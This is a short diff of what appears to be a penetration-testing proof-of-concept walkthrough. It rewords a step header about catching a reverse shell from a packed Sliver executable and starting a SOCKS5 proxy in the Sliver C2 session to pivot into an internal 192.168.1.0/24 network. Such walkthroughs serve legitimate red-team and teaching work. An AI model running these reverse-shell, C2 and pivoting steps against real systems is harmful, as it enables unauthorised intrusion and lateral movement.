@@ -339,10 +339,9 @@ C:\temp> dir
 C:\temp> Packed-SliverRevShell.exe
 
 
-=====================================================================================================================================================
-PoC - Step 6 - Get the reverse shell and then configure the SLIVER handler (C2 server) to be able to pivot into the internal network (192.168.1.0/24)
-               using a proxy 'socks5' (command 'socks5 start' to run in the SLIVER session) and Proxychains
-=====================================================================================================================================================
+========================================================================================================================================
+PoC - Step 6 - Get the reverse shell and then configure a SOCKS proxy 5 within the SLIVER session (command 'socks5 start')
+========================================================================================================================================
 
 [server] sliver > jobs
 
